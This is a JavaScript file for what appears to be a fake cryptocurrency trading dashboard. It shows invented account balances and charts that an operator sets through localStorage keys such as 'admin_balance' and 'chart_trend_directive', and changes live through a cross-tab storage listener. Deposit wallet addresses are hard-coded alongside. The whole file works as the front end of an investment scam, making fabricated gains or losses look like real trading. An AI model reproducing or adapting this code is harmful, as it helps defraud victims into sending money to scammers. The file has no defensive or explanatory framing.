document.addEventListener('DOMContentLoaded', () => {
    console.log("Dynamic data engine initialized.");

    // 1. Core State Tracking Variables
    let currentBalance = 1000.00;
    try {
        const storedBalance = localStorage.getItem('admin_balance');
        if (storedBalance) currentBalance = parseFloat(storedBalance);
    } catch (e) {
        console.error("Storage error:", e);
    }
    
    let walletAddresses = {
        'USDT (TRC20)': localStorage.getItem('admin_address') || "0x71C2496E7278274d3b4614a420971a9E3a9411bb",
        'Bitcoin (BTC Mainnet)': localStorage.getItem('btc_address') || "1BitcoinAddressHere",
        'Ethereum (ETH ERC20)': localStorage.getItem('eth_address') || "0xEthAddressHere"
    };

    // 2. Continuous Number Renderer
    function updateBalanceDisplay() {
        const display = document.getElementById('balance-display');
        if (display) {
            display.innerText = '$' + currentBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
        }
    }
    updateBalanceDisplay();

    // 3. Dynamic Vector Array Calculator
    let chartInstance = null;
    const ctx = document.getElementById('LivePerformanceChart');

    function generateDynamicPoints(trend, baseValue) {
        const reference = baseValue > 0 ? baseValue : 600;
        // Seed predictable nodes based on the target balance
        let point1 = reference * 0.95;
        let point2 = reference * 0.98;
        let point3 = reference * 0.96;
        let point4 = reference * 1.01;
        let point5 = reference * 0.99;
        let point6 = reference * 1.03;
        let point7 = reference;

        // Apply shift weights based on chosen control trend
        if (trend === 'upward') {
            point4 += (reference * 0.04);
            point5 += (reference * 0.03);
            point6 += (reference * 0.06);
            point7 += (reference * 0.05);
        } else if (trend === 'downward') {
            point4 -= (reference * 0.05);
            point5 -= (reference * 0.07);
            point6 -= (reference * 0.09);
            point7 -= (reference * 0.12);
        }

        // Add micro-noise so lines are never perfectly flat
        const noise = (amplitude) => (Math.random() - 0.5) * (reference * amplitude);
        return [
            point1 + noise(0.01),
            point2 + noise(0.01),
            point3 + noise(0.015),
            point4 + noise(0.015),
            point5 + noise(0.02),
            point6 + noise(0.02),
            point7 + noise(0.005)
        ];
    }

    // 4. Chart Rendering Execution
    function renderEngine() {
        if (!ctx || typeof Chart === 'undefined') return;
        
        const activeTrend = localStorage.getItem('chart_trend_directive') || 'stable';
        const updatedDataset = generateDynamicPoints(activeTrend, currentBalance);

        if (chartInstance) {
            chartInstance.destroy();
        }

        const chartContext = ctx.getContext('2d');
        const fillGradient = chartContext.createLinearGradient(0, 0, 0, ctx.canvas.clientHeight || 250);
        
        // Define theme aesthetics based on current trajectory vector
        let UIThemeColor = '#10b981'; // Emerald Green
        if (activeTrend === 'downward') {
            UIThemeColor = '#ef4444'; // Crimson Red
            fillGradient.addColorStop(0, 'rgba(239, 68, 68, 0.22)');
            fillGradient.addColorStop(1, 'rgba(239, 68, 68, 0.00)');
        } else {
            fillGradient.addColorStop(0, 'rgba(16, 185, 129, 0.22)');
            fillGradient.addColorStop(1, 'rgba(16, 185, 129, 0.00)');
        }

        chartInstance = new Chart(chartContext, {
            type: 'line',
            data: {
                labels: ['02:00 PM', '04:00 PM', '06:00 PM', '08:00 PM', '10:00 PM', '12:00 AM', '02:00 AM'],
                datasets: [{
                    data: updatedDataset,
                    borderColor: UIThemeColor,
                    borderWidth: 2.5,
                    pointBackgroundColor: UIThemeColor,
                    pointRadius: 1.5,
                    tension: 0.38,
                    fill: true,
                    backgroundColor: fillGradient
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: { legend: { display: false } },
                scales: {
                    x: {
                        grid: { color: 'rgba(51, 65, 85, 0.12)', drawBorder: false },
                        ticks: { color: '#64748b', font: { size: 10 } }
                    },
                    y: {
                        grid: { color: 'rgba(51, 65, 85, 0.12)', drawBorder: false },
                        ticks: { 
                            color: '#64748b', 
                            font: { size: 10 },
                            callback: function(v) { return '$' + v.toFixed(2); }
                        }
                    }
                }
            }
        });
    }

    // Initial load execution
    renderEngine();

    // 5. Background Loop Engine (Runs every 3.5 seconds)
    setInterval(() => {
        const currentTrend = localStorage.getItem('chart_trend_directive') || 'stable';
        
        // Simulates changing numbers on screen based on the trend vector
        if (currentTrend === 'upward') {
            currentBalance += (Math.random() * 1.45);
        } else if (currentTrend === 'downward') {
            currentBalance -= (Math.random() * 1.65);
        } else {
            // Fluctuate up and down slightly to simulate normal live noise
            currentBalance += (Math.random() - 0.5) * 0.85;
        }

        // Apply boundaries so numbers stay realistic
        if (currentBalance < 0) currentBalance = 0;

        // Push updates onto layout views
        updateBalanceDisplay();
        renderEngine();
    }, 3500);

    // 6. External Cross-Tab Command Event Interceptor
    window.addEventListener('storage', (event) => {
        if (!event.newValue) return;

        if (event.key === 'admin_balance') {
            currentBalance = parseFloat(event.newValue) || 0.00;
            updateBalanceDisplay();
            renderEngine();
        }
        if (event.key === 'chart_trend_directive') {
            renderEngine();
        }
        if (event.key === 'forced_network') {
            if (typeof window.switchCryptoNetwork === 'function') {
                window.switchCryptoNetwork(event.newValue);
            }
        }
    });
});
